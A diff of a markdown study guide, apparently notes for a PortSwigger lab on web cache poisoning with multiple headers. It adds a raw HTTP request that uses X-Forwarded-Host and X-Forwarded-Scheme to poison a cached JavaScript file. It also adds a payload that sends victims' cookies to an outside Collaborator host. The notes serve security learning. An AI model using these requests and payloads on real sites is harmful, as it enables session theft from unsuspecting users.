@@ -681,10 +681,21 @@ document.location='https://Collaborator.com/?CacheCookies='+document.cookie;
 
 >Identify that cache hit headers in responses, then test if the target support ```X-Forwarded-Host``` or ```X-Forwarded-Scheme``` headers. These headers can allow for the stealing of victim session cookie.  
   
->Change Exploit server file name to ```/resources/js/tracking.js``` as observed on target.  
+>Identify if the adding the two **Forwarded** headers to the GET ```/resources/js/tracking.js``` request change the location response header, ***identify*** poisoning the cache with multiple headers positive.  
 
 ```html
+GET /resources/js/tracking.js?cb=123 HTTP/2
+Host: TARGET.net
+X-Forwarded-Host: EXPLOIT.net
+X-Forwarded-Scheme: nothttps
+```  
 
+![x-forwarded-scheme nohttps](images\x-forwarded-scheme-nohttps.png)  
+
+>On the exploit server change the file path to ```/resources/js/tracking.js``` and the update the poison request ```X-Forwarded-Host: EXPLOIT.net``` header. Place the payload on exploit server body.  
+
+```html
+document.location='https://Collaborator.com/?poisoncache='+document.cookie;
 ```  
 
 [PortSwigger Lab: Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)  
